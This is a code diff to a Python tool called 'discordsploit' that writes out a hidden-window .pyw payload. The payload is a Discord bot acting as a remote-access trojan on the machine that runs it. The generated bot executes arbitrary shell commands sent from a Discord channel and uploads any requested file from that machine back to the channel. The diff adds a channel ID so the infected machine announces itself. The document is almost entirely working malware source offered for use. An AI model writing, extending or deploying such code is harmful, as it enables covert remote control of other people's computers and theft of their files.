@@ -13,6 +13,7 @@ LOGO = ("""
 """)
 def shell():
     token = ''
+    channelid = ''
     inputList = ["foo", "bar"]
     while True:
         _input = input("discordsploit # ")
@@ -22,6 +23,7 @@ def shell():
             print("""
             Usage:
             	discordsploit # token 'token'
+                discordsploit # channelid 'channelid'
             	discordsploit # create 'name'
             Commands:
             		options
@@ -31,9 +33,12 @@ def shell():
         elif _input == "options":
             print(f"""
             token > {token}
+            channeild > {channelid}
             """)
         elif inputList[0] == "token" and "token " in _input:
             token = inputList[1]  
+        elif inputList[0] == "channelid" and "channelid " in _input:
+            channelid = inputList[1]
         elif inputList[0] == "create":
             name = inputList[1]
             file = open(f"{name}.pyw", "w")
@@ -42,20 +47,23 @@ import discord
 import subprocess
 from discord.ext import commands
 from discord.ext.commands import bot
-bot = commands.Bot(command_prefix='#')
+bot = commands.Bot(command_prefix='#', help_command=None)
 @bot.event
 async def on_ready():
-    print('Connected!')
+    await bot.get_channel({channelid}).send("`DiscordSploit is ready type #help for help.`")
+@bot.command(name='help')
+async def help(ctx):
+    await ctx.send('''`cmd       Executes commands in shell
+download  Downloads a file 
+help      Shows this message`''')
 @bot.command(pass_context=True)
 async def cmd(ctx, *args):
-    print(args)
     proc = subprocess.Popen(args, stdout=subprocess.PIPE, shell=True)
     (out, err) = proc.communicate()
     await ctx.send("`" + str(out) + "`")
 @bot.command(pass_context=True)
 async def download(ctx, *args):
     joined = ' '.join(args)
-    print(joined)
     await ctx.send(joined , file=discord.File(joined))
 bot.run('{token}')
             """)
